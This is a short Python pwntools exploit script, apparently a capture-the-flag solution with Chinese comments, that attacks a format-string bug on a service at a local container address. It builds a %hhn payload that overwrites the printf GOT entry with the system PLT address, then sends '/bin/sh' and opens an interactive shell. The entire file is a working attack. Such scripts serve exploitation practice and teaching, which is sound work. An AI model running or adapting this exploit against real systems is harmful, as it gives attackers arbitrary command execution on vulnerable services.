#!/usr/bin/python
#coding:utf-8

from pwn import *

io = remote('172.17.0.2', 10001)
context.update(arch = 'i386', os = 'linux')

offset = 5
printf_got = 0x08049778
system_plt = 0x08048320

payload = p32(printf_got)		#使用hhn写入，所以需要四个地址，分别对应待写入的第4~1字节
payload += p32(printf_got+1)
payload += p32(printf_got+2)
payload += p32(printf_got+3)
payload += "%"		
payload += str(0x20-16)			#被写入的数据，注意四个地址长度是16，需要减掉
payload += "c%5$hhn"
payload += "%"
payload += str(0x83-0x20)		
payload += "c%6$hhn"
payload += "%"
payload += str(0x104-0x83)		#由于是hhn所以会被截断，只留后两位
payload += "c%7$hhn"
payload += "%"
payload += str(0x08-0x04)
payload += "c%8$hhn"

#payload = fmtstr_payload(5, {printf_got:system_plt})
io.sendline(payload)
io.recv()
io.sendline('/bin/sh\x00')
io.interactive()
